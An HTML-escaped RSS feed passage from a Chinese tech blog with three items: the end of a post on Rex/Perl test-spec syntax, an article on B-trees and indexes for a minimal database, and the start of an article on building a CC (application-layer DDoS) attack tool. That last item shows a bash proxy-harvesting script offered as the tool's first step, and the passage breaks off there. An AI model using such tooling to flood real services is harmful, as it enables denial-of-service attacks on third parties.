    &lt;span class=&quot;n&quot;&gt;describe&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Nginx Test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nginx -t&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;nginx.conf testing&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;stdout&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;qr/ok/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/nginx.conf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;ensure&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;present&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;content&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;qr/listen\s+80;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nginx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;ensure&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;running&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nginx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;ensure&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;present&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;version&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;1.5.8&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cron&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;www&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;logrotate&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gateway&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;192.168.0.1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;www&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;ensure&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;bind&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;proto&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;tcp&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;nginx&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;nginx&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;qr(nginx -c /etc/nginx.conf)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;mem&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is_deeply&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;destination&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;gateway&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;genmask&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$genmask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;mss&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;irtt&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$irtt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$iface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sysctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;vm.swapiness&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;www&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;ensure&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;home&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;/var/www/html&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;shell&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;/sbin/nologin&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is_deeply&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;belong_to&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;www&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;nogroup&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;done_testing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;从 Rspec 学来的 context/describe/it/its 语法，保留了 Test::More 的 is/like/is_deeply/done_testing 语法。&lt;/p&gt;

&lt;p&gt;这里把 Test::More 里导入的指令都重载了，因为把 context 指令后面的资源类型通过 &lt;code&gt;local $msg&lt;/code&gt; 变量传递过来，就可以显示出来每个 &lt;code&gt;its&lt;/code&gt; 测试是什么资源类型的了。因为这个原因，指令导出的时候就没法用 &lt;code&gt;Exporter&lt;/code&gt; 模块，因为 Exporter 里的 import 函数没有 &lt;code&gt;no strict;no warnings&lt;/code&gt;。所以得自己写 import 函数导出。&lt;/p&gt;

&lt;p&gt;具体的资源类型，第一次学习了一下 AUTOLOAD 的用法。还是蛮好玩的~&lt;/p&gt;

&lt;p&gt;因为我是在 Mac 上写的代码，而 Rex 本身不怎么支持 Darwin 平台，所以源码里就测了一下 run 指令可用。欢迎大家帮忙补齐其他指令的测试用例，以及如何在 Rex 的 task 里通过 SSH 方式远程做这些测试（公司平台也没法让我做这个 SSH 测试）。&lt;/p&gt;

    &lt;hr&gt;
    
    &lt;hr&gt;
    


  &lt;!-- UY BEGIN --&gt;


&lt;!-- UY END --&gt;






  &lt;/div&gt;
</description>
        <pubDate>Tue, 08 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-08-rex-test-spec-7f1d6866c.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-08-rex-test-spec-7f1d6866c.html</guid>
        
        
      </item>
    
      <item>
        <title>数据库的最简单实现</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;所有应用软件之中，数据库可能是最复杂的。&lt;/p&gt;
&lt;p&gt;MySQL的手册有3000多页，PostgreSQL的手册有2000多页，Oracle的手册更是比它们相加还要厚。&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/8867388b24ef672a4b50d18fde89d9b5.jpg&quot; rel=&quot;lightbox[73127]&quot; title=&quot;数据库的最简单实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73128&quot; alt=&quot;bg2014070401&quot; src=&quot;/images/jobbole.com/41541a92e517d8068c02cbd3d63b9e40.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是，自己写一个最简单的数据库，做起来并不难。Reddit上面有一个&lt;a href=&quot;http://www.reddit.com/r/Database/comments/27u6dy/how_do_you_build_a_database/ciggal8&quot; target=&quot;_blank&quot;&gt;帖子&lt;/a&gt;，只用了几百个字，就把原理讲清楚了。下面是我根据这个帖子整理的内容。&lt;/p&gt;
&lt;h2&gt;一、数据以文本形式保存&lt;/h2&gt;
&lt;p&gt;第一步，就是将所要保存的数据，写入文本文件。这个文本文件就是你的数据库。&lt;/p&gt;
&lt;p&gt;为了方便读取，数据必须分成记录，每一条记录的长度规定为等长。比如，假定每条记录的长度是800字节，那么第5条记录的开始位置就在3200字节。&lt;/p&gt;
&lt;p&gt;大多数时候，我们不知道某一条记录在第几个位置，只知道&lt;a href=&quot;http://zh.wikipedia.org/zh/%E5%85%B3%E7%B3%BB%E9%94%AE&quot; target=&quot;_blank&quot;&gt;主键&lt;/a&gt;（primary key）的值。这时为了读取数据，可以一条条比对记录。但是这样做效率太低，实际应用中，数据库往往采用&lt;a href=&quot;http://en.wikipedia.org/wiki/B-tree&quot; target=&quot;_blank&quot;&gt;B树&lt;/a&gt;（B-tree）格式储存数据。&lt;/p&gt;
&lt;h2&gt;二、什么是B树？&lt;/h2&gt;
&lt;p&gt;要理解B树，必须从&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%BA%8C%E5%85%83%E6%90%9C%E5%B0%8B%E6%A8%B9&quot; target=&quot;_blank&quot;&gt;二叉查找树&lt;/a&gt;（Binary search tree）讲起。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/b531348e6e75eaf25fa37b65493e79b6.png&quot; rel=&quot;lightbox[73127]&quot; title=&quot;数据库的最简单实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73129&quot; alt=&quot;bg2014070402&quot; src=&quot;/images/jobbole.com/40c826bd4da7b45ca0d831dedeee8f0b.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;二叉查找树是一种查找效率非常高的数据结构，它有三个特点。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1）每个节点最多只有两个子树。&lt;/p&gt;
&lt;p&gt;（2）左子树都为小于父节点的值，右子树都为大于父节点的值。&lt;/p&gt;
&lt;p&gt;（3）在n个节点中找到目标值，一般只需要log(n)次比较。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;二叉查找树的结构不适合数据库，因为它的查找效率与层数相关。越处在下层的数据，就需要越多次比较。极端情况下，n个数据需要n次比较才能找到目标值。对于数据库来说，每进入一层，就要从硬盘读取一次数据，这非常致命，因为硬盘的读取时间远远大于数据处理时间，数据库读取硬盘的次数越少越好。&lt;/p&gt;
&lt;p&gt;B树是对二叉查找树的改进。它的设计思想是，将相关数据尽量集中在一起，以便一次读取多个数据，减少硬盘操作次数。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/9796a78eaf6430ddd86967103f6f4085.png&quot; rel=&quot;lightbox[73127]&quot; title=&quot;数据库的最简单实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73130&quot; alt=&quot;bg2014070403&quot; src=&quot;/images/jobbole.com/860e0d5938c30bc2bff4ae1239093d6a.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;B树的特点也有三个。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1）一个节点可以容纳多个值。比如上图中，最多的一个节点容纳了4个值。&lt;/p&gt;
&lt;p&gt;（2）除非数据已经填满，否则不会增加新的层。也就是说，B树追求”层”越少越好。&lt;/p&gt;
&lt;p&gt;（3）子节点中的值，与父节点中的值，有严格的大小对应关系。一般来说，如果父节点有a个值，那么就有a+1个子节点。比如上图中，父节点有两个值（7和16），就对应三个子节点，第一个子节点都是小于7的值，最后一个子节点都是大于16的值，中间的子节点就是7和16之间的值。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这种数据结构，非常有利于减少读取硬盘的次数。假定一个节点可以容纳100个值，那么3层的B树可以容纳100万个数据，如果换成二叉查找树，则需要20层！假定操作系统一次读取一个节点，并且根节点保留在内存中，那么B树在100万个数据中查找目标值，只需要读取两次硬盘。&lt;/p&gt;
&lt;h2&gt;三、索引&lt;/h2&gt;
&lt;p&gt;数据库以B树格式储存，只解决了按照”主键”查找数据的问题。如果想查找其他字段，就需要建立索引（index）。&lt;/p&gt;
&lt;p&gt;所谓索引，就是以某个字段为关键字的B树文件。假定有一张”雇员表”，包含了员工号（主键）和姓名两个字段。可以对姓名建立索引文件，该文件以B树格式对姓名进行储存，每个姓名后面是其在数据库中的位置（即第几条记录）。查找姓名的时候，先从索引中找到对应第几条记录，然后再从表格中读取。&lt;/p&gt;
&lt;p&gt;这种索引查找方法，叫做&lt;a href=&quot;http://en.wikipedia.org/wiki/ISAM&quot; target=&quot;_blank&quot;&gt;“索引顺序存取方法”&lt;/a&gt;（Indexed Sequential Access Method），缩写为ISAM。它已经有多种实现（比如C-ISAM库和D-ISAM库），只要使用这些代码库，就能自己写一个最简单的数据库。&lt;/p&gt;
&lt;h2&gt;四、高级功能&lt;/h2&gt;
&lt;p&gt;部署了最基本的数据存取（包括索引）以后，还可以实现一些高级功能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）SQL语言&lt;/strong&gt;是数据库通用操作语言，所以需要一个SQL解析器，将SQL命令解析为对应的ISAM操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）数据库连接（join）&lt;/strong&gt;是指数据库的两张表通过”外键”，建立连接关系。你需要对这种操作进行优化。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）数据库事务（transaction）&lt;/strong&gt;是指批量进行一系列数据库操作，只要有一步不成功，整个操作都不成功。所以需要有一个”操作日志”，以便失败时对操作进行回滚。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（4）备份机制&lt;/strong&gt;：保存数据库的副本。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（5）远程操作&lt;/strong&gt;：使得用户可以在不同的机器上，通过TCP/IP协议操作数据库。&lt;/p&gt;
&lt;p&gt;（完）&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Tue, 08 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-08-73127-ce4c7bb64.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-08-73127-ce4c7bb64.html</guid>
        
        
      </item>
    
      <item>
        <title>DDoS攻防战（二）：CC攻击工具实现与防御理论</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;我们将要实现一个进行应用层DDoS攻击的工具，综合考虑，CC攻击方式是最佳选择，并用bash shell脚本来快速实现并验证这一工具，并在最后，讨论如何防御来自应用层的DDoS攻击。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一步：获取大量可用代理ip:port列表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;网上所处可见免费代理，我们使用http的GET方法抓取html文档，接着使用正则过滤出我们需要的ip port对，然后逐一验证各代理的可用性，最终得到可用的代理ip port对。&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt; grab_proxy.sh
#!/bin/bash

#get proxy list
declare proxyListFile=&quot;proxy.txt&quot;
declare tmpFile=`mktemp`
declare url
declare line
declare times
declare ip
declare port
declare i
declare j
declare mod

function quit() {
    rm -f $tmpFile
    exit &quot;$1&quot;
}

echo &quot;get proxy list... please wait...&quot;

if [ -r &quot;$proxyListFile&quot; ]
then
  rm -f $proxyListFile
fi

touch $proxyListFile

for url in  &quot; http://www.youdaili.cn/Daili/guonei/2215.html &quot; \
            &quot; http://www.youdaili.cn/Daili/guonei/2215_2.html&quot; \
            &quot; http://www.youdaili.cn/Daili/guonei/2215_3.html&quot; \
            &quot; http://www.youdaili.cn/Daili/guonei/2215_4.html &quot;
do
    if GET &quot;$url&quot; &amp;gt; $tmpFile
    then
        grep -oE &#39;^.*&amp;lt;br /&amp;gt;.*$&#39; &quot;$tmpFile&quot; | grep -Eo &quot;([0-9]+)(\.[0-9]+){3}:([0-9]+)&quot; \
        | sort -n | uniq | awk -F: &#39;{ printf(&quot;%-15s  %s \n&quot;,$1,$2); }&#39; &amp;gt;&amp;gt; $proxyListFile
    else
        exec 1&amp;gt;&amp;amp;2
        echo &quot;error: get proxy list fail! chech the url:$url or the network&quot;
        quit 1
    fi
done

echo &quot;done. total `cat $proxyListFile | wc -l` proxy&quot;

quit 0
#exit&lt;/pre&gt;
&lt;p&gt;参数：&lt;/p&gt;
